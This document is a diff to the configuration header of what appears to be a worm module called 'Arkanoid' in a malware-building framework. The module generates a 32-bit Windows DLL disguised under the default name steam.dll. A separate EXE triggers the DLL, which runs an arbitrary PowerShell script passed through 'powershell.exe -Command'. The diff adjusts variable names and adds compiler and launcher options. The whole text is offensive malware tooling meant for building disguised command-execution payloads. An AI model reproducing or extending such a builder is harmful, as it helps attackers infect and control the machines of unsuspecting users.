@@ -1,17 +1,22 @@
 #!name##Arkanoid
 #!types##worm
-#!info##Creates a DLL library (win32) containing a payload that is triggered from second EXE file as a function. You can also create another program yourself that uses this library. You can see an example use of function in “.asm” file.
+#!info##Creates a DLL library x86 (32 bit) containing a payload that is triggered from second EXE file as a function. You can also create another program yourself that uses this library. You can see an example use of function in “.asm” file.
 #!lang##asm
 #!system_FLAG##[W]
+#!globalVar##COMPILER##mingw-x32##The name of the compiler to build the executable file.
+#!globalVar##NO_DLL##True##Not include DLL
 #!processWorm##BasicDLL
-#!reqVar##_DLL_NAME##DLL file name##str
-#!setVar##_DLL_NAME##steam.dll##str
-#!setVar##_DLL_FUNC_myFunc##myFunc##str
-#!setVar##_DLL_FUNC_f2##Print##str
+#!reqVar##DLL_NAME##DLL file name##str
+#!setVar##DLL_NAME##steam.dll##str
+#!setVar##DLL_EXFUNC1##myFunc##str
+#!setVar##DLL_EXFUNC2##Print##str
+#!setVar##DLL_TOO_EXPORT##True##bool
+#!setVar##DLL_LAUNCHER##DllLoader_x32##str
 #!reqPayload##ARK_script##PowerShell script to execute
 #!payStep##asm_stack_build
 #!payloadOpt##ARK_script##asm_stack_build_cmd##powershell.exe -Command "$"
 #!banned##module##starter##shadow##junk
+#!reqCS##RandomDll
 
 extern _system
 extern _ExitProcess@4
